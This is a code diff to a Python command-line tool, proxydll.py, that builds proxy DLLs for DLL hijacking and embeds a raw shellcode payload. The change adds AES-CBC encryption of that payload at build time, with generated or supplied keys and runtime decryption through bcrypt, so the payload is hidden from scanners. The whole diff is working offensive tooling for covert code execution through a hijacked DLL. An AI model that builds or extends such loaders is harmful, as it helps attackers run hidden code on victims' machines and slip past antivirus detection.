@@ -19,6 +19,7 @@ sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 
 from src.dll_parser import parse_dll
 from src.code_generator import write_build_files
+from src.aes_crypto import EncryptParams, encrypt_shellcode, parse_hex_key, parse_hex_iv
 from src.compiler import (
     ALL_ARCH_CONFIGS,
     check_compilers,
@@ -39,14 +40,22 @@ def build_parser() -> argparse.ArgumentParser:
         epilog="""
 Examples
 --------
-  # Build proxy for both x64 and x86 (default)
+  # No encryption (default)
   python proxydll.py -dll version.dll -shellcode payload.bin
 
-  # Build only x64 proxy, custom output name
-  python proxydll.py -dll version.dll -shellcode payload.bin -arch x64 -o myproxy
+  # Auto-generate AES-256 key and IV, encrypt shellcode at build time
+  python proxydll.py -dll version.dll -shellcode payload.bin --encrypt
 
-  # Inspect generated sources
-  python proxydll.py -dll target.dll -shellcode shell.bin --keep-sources -v
+  # Use AES-128 instead of the default AES-256
+  python proxydll.py -dll version.dll -shellcode payload.bin --encrypt --aes-bits 128
+
+  # Shellcode already AES-encrypted; supply the key and IV (hex)
+  python proxydll.py -dll version.dll -shellcode payload.enc \\
+      --aes-key <64-hex-chars> --aes-iv <32-hex-chars>
+
+  # x64 only, custom output name, keep generated sources
+  python proxydll.py -dll version.dll -shellcode payload.bin -arch x64 -o myproxy \\
+      --encrypt --keep-sources -v
 
 Deployment
 ----------
@@ -56,7 +65,7 @@ Deployment
         """,
     )
 
-    # Required
+    # ---- Required ----
     p.add_argument(
         "-dll",
         required=True,
@@ -67,10 +76,46 @@ Deployment
         "-shellcode",
         required=True,
         metavar="SHELLCODE_PATH",
-        help="Path to a raw binary shellcode file",
+        help="Path to a raw binary shellcode file (plain or pre-encrypted)",
     )
 
-    # Optional
+    # ---- Encryption ----
+    enc_group = p.add_argument_group(
+        "AES encryption",
+        "Encrypt the embedded shellcode with AES-CBC.  Use --encrypt to let the\n"
+        "tool generate a random key and IV, or supply --aes-key / --aes-iv when\n"
+        "the shellcode file is already encrypted (requires pycryptodome).",
+    )
+    mode = enc_group.add_mutually_exclusive_group()
+    mode.add_argument(
+        "--encrypt",
+        action="store_true",
+        help="Encrypt shellcode with a randomly generated AES key and IV (default key size: AES-256)",
+    )
+    mode.add_argument(
+        "--aes-key",
+        metavar="HEX",
+        help=(
+            "Hex-encoded AES key for a pre-encrypted shellcode file "
+            "(32 hex chars = AES-128, 48 = AES-192, 64 = AES-256). "
+            "Must be paired with --aes-iv."
+        ),
+    )
+    enc_group.add_argument(
+        "--aes-iv",
+        metavar="HEX",
+        help="Hex-encoded 16-byte AES IV for a pre-encrypted shellcode file (32 hex chars). Requires --aes-key.",
+    )
+    enc_group.add_argument(
+        "--aes-bits",
+        type=int,
+        choices=[128, 192, 256],
+        default=256,
+        metavar="BITS",
+        help="AES key size in bits when using --encrypt: 128 | 192 | 256  (default: 256)",
+    )
+
+    # ---- Optional ----
     p.add_argument(
         "-arch",
         choices=["x64", "x86", "all"],
@@ -92,7 +137,7 @@ Deployment
     p.add_argument(
         "--keep-sources",
         action="store_true",
-        help="Keep the generated dllmain.c and proxy.def files after compilation",
+        help="Keep the generated dllmain.c, stubs.s, and proxy.def files after compilation",
     )
     p.add_argument(
         "-v", "--verbose",
@@ -131,6 +176,20 @@ def main() -> int:
     args = build_parser().parse_args()
 
     # ------------------------------------------------------------------
+    # Validate encryption argument combinations
+    # ------------------------------------------------------------------
+    has_key = bool(args.aes_key)
+    has_iv  = bool(args.aes_iv)
+
+    if has_key != has_iv:
+        _err("--aes-key and --aes-iv must be supplied together")
+        return 1
+
+    if args.aes_bits != 256 and not args.encrypt:
+        _err("--aes-bits is only valid together with --encrypt")
+        return 1
+
+    # ------------------------------------------------------------------
     # Validate inputs
     # ------------------------------------------------------------------
     if not os.path.isfile(args.dll):
@@ -149,7 +208,7 @@ def main() -> int:
     # Derive names
     # ------------------------------------------------------------------
     dll_basename = os.path.splitext(os.path.basename(args.dll))[0]
-    proxy_name = args.output or dll_basename
+    proxy_name   = args.output or dll_basename
 
     architectures: list[str] = (
         ["x64", "x86"] if args.arch == "all" else [args.arch]
@@ -171,7 +230,7 @@ def main() -> int:
             traceback.print_exc()
         return 1
 
-    named_count = sum(1 for e in dll_info.exports if e.name)
+    named_count  = sum(1 for e in dll_info.exports if e.name)
     ordinal_only = sum(1 for e in dll_info.exports if not e.name)
 
     _info(
@@ -196,6 +255,50 @@ def main() -> int:
         )
 
     _info(f"Shellcode       : {args.shellcode} ({shellcode_size:,} bytes)")
+
+    # ------------------------------------------------------------------
+    # Read shellcode and resolve encryption parameters
+    # ------------------------------------------------------------------
+    with open(args.shellcode, "rb") as fh:
+        sc_raw = fh.read()
+
+    encrypt_params: EncryptParams | None = None
+    extra_link_flags: tuple[str, ...]    = ()
+    shellcode: bytes                     = sc_raw
+
+    if args.encrypt:
+        # Auto-generate key + IV, encrypt shellcode
+        try:
+            shellcode, encrypt_params = encrypt_shellcode(sc_raw, bits=args.aes_bits)
+        except ImportError as exc:
+            _err(str(exc))
+            return 1
+
+        _info(f"Encryption      : AES-{encrypt_params.bits}-CBC (auto-generated key)")
+        _ok(f"  Key (hex) : {encrypt_params.key_hex()}")
+        _ok(f"  IV  (hex) : {encrypt_params.iv_hex()}")
+        _info(
+            f"  Plaintext : {len(sc_raw):,} bytes  "
+            f"→  ciphertext: {len(shellcode):,} bytes"
+        )
+        extra_link_flags = ("-lbcrypt",)
+
+    elif has_key and has_iv:
+        # Pre-encrypted shellcode — validate and use the supplied key/IV
+        try:
+            key = parse_hex_key(args.aes_key)
+            iv  = parse_hex_iv(args.aes_iv)
+        except ValueError as exc:
+            _err(str(exc))
+            return 1
+
+        encrypt_params   = EncryptParams(key=key, iv=iv)
+        _info(f"Encryption      : AES-{encrypt_params.bits}-CBC (user-supplied key)")
+        extra_link_flags = ("-lbcrypt",)
+
+    else:
+        _info("Encryption      : none")
+
     _info(f"Proxy DLL name  : {proxy_name}.dll")
     _info(f"Original DLL    : loaded from System32 at runtime")
     print()
@@ -205,7 +308,7 @@ def main() -> int:
     # ------------------------------------------------------------------
     _info("Checking compilers...")
     available = check_compilers(architectures)
-    missing = [a for a, p in available.items() if not p]
+    missing   = [a for a, p in available.items() if not p]
 
     for arch, path in available.items():
         if path:
@@ -216,7 +319,6 @@ def main() -> int:
     if missing:
         print()
         _warn("Missing compiler(s). Install mingw-w64 to enable the missing targets:")
-        # All missing archs share the same install hint
         print(install_hint(missing[0]))
 
     if len(missing) == len(architectures):
@@ -230,7 +332,7 @@ def main() -> int:
     # Build loop
     # ------------------------------------------------------------------
     success_count = 0
-    build_count = 0
+    build_count   = 0
 
     sources_base = os.path.join(args.output_dir, "_sources") if args.keep_sources else None
 
@@ -241,7 +343,7 @@ def main() -> int:
             continue
 
         build_count += 1
-        cfg = ALL_ARCH_CONFIGS[arch]
+        cfg        = ALL_ARCH_CONFIGS[arch]
         out_subdir = os.path.join(args.output_dir, cfg.output_subdir)
         os.makedirs(out_subdir, exist_ok=True)
         output_dll = os.path.join(out_subdir, f"{proxy_name}.dll")
@@ -259,11 +361,15 @@ def main() -> int:
                 build_dir=build_dir,
                 proxy_name=proxy_name,
                 dll_info=dll_info,
-                shellcode_path=args.shellcode,
+                shellcode=shellcode,
                 arch=arch,
+                encrypt_params=encrypt_params,
             )
         except Exception as exc:
             _err(f"  Source generation failed: {exc}")
+            if args.verbose:
+                import traceback
+                traceback.print_exc()
             if not sources_base:
                 shutil.rmtree(build_dir, ignore_errors=True)
             continue
@@ -283,6 +389,7 @@ def main() -> int:
             output_dll=output_dll,
             compiler_path=compiler_path,
             verbose=args.verbose,
+            extra_link_flags=extra_link_flags,
         )
 
         # Clean up temp build dir unless --keep-sources
@@ -313,7 +420,7 @@ def main() -> int:
     _info("Output structure:")
     for arch in architectures:
         if available.get(arch):
-            cfg = ALL_ARCH_CONFIGS[arch]
+            cfg     = ALL_ARCH_CONFIGS[arch]
             out_dll = os.path.join(args.output_dir, cfg.output_subdir, f"{proxy_name}.dll")
             if os.path.isfile(out_dll):
                 print(f"    {out_dll}")
